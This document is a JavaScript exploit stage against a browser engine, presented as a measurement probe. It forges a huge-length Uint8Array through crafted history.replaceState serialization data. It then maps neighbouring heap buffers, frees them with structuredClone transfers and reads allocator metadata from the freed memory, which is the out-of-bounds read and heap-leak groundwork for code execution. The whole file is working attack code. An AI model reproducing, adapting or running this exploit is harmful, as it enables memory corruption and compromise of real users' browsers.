// Compare metadata in two measured, same-size fixed-buffer slots as each is freed.
// This reports bytes only; pointer/link interpretation is an offline question.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
function words(bytes) {
  var result = [];
  for (var i = 0; i + 7 < bytes.length; i += 8) {
    var hex = "";
    for (var j = 7; j >= 0; j--)
      hex += bytes[i + j].toString(16).padStart(2, "0");
    result.push("0x" + hex);
  }
  return result.join(",");
}
function sample(view, first) {
  var bytes = [];
  for (var i = 0; i < 64; i++) bytes.push(view[first + i]);
  return words(bytes);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var originals = [];
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  for (var a = 0; a < 2; a++) {
    var fixed = new ArrayBuffer(66224);
    new Uint8Array(fixed).fill(0x91 + a);
    originals.push(fixed);
    filler[2 + a] = fixed;
  }
  for (var n = 4; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("free_pair_stored");
  phase = "load";
  var output = history.state;
  mark("free_pair_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var clones = [new Uint8Array(output.filler[2]), new Uint8Array(output.filler[3])];
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && clones[0].length === 66224 &&
    clones[1].length === 66224;
  var firsts = [-1, -1];
  var counts = [0, 0];
  var before = [null, null];
  var afterSecond = null;
  var afterBoth = [null, null];
  var detached = [false, false];
  if (valid) {
    phase = "map";
    var limit = 262144;
    var baseline = new Uint8Array(limit);
    for (var b = 0; b < limit; b++) baseline[b] = synthetic[b];
    for (var m = 0; m < 2; m++) {
      clones[m].fill(0xc4);
      for (var q = 0; q < limit; q++) {
        if (synthetic[q] !== baseline[q]) {
          if (firsts[m] < 0) firsts[m] = q;
          counts[m]++;
        }
      }
      clones[m].fill(0x91 + m);
    }
    var mapped = firsts[0] >= 0 && firsts[1] >= 0 &&
      firsts[0] !== firsts[1] &&
      counts[0] === Math.min(66224, limit - firsts[0]) &&
      counts[1] === Math.min(66224, limit - firsts[1]) &&
      synthetic[firsts[0]] === 0x91 && synthetic[firsts[1]] === 0x92 &&
      synthetic[firsts[0] + 66223] === 0x91 &&
      synthetic[firsts[1] + 66223] === 0x92;
    if (mapped) {
      mark("free_pair_mapped");
      before[0] = sample(synthetic, firsts[0]);
      before[1] = sample(synthetic, firsts[1]);
      phase = "release_second";
      mark("free_pair_before_second_release");
      structuredClone(0, { transfer: [output.filler[3]] });
      detached[1] = clones[1].length === 0;
      phase = "read_second_freed";
      mark("free_pair_before_second_read");
      afterSecond = sample(synthetic, firsts[1]);
      phase = "release_first";
      mark("free_pair_before_first_release");
      structuredClone(0, { transfer: [output.filler[2]] });
      detached[0] = clones[0].length === 0;
      phase = "read_both_freed";
      mark("free_pair_before_both_read");
      afterBoth[0] = sample(synthetic, firsts[0]);
      afterBoth[1] = sample(synthetic, firsts[1]);
    }
  }
  result = { id: "free_link_pair",
    status: valid && mapped && detached[0] && detached[1] &&
      afterBoth[0] !== null && afterBoth[1] !== null ? "pass" : "fail", details: {
    view_valid: valid, mapped: Boolean(mapped), first_indices: firsts.join(","),
    changed_prefix_counts: counts.join(","),
    distance: firsts[0] >= 0 && firsts[1] >= 0 ? firsts[1] - firsts[0] : null,
    detached: detached.join(","), before_first: before[0],
    before_second: before[1], after_second_release: afterSecond,
    after_both_first: afterBoth[0], after_both_second: afterBoth[1],
    target_first: new Uint8Array(target)[0],
    original_markers: originals.map(function (buffer) {
      return new Uint8Array(buffer)[0];
    }).join(",")
  } };
} catch (error) {
  result = { id: "free_link_pair", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
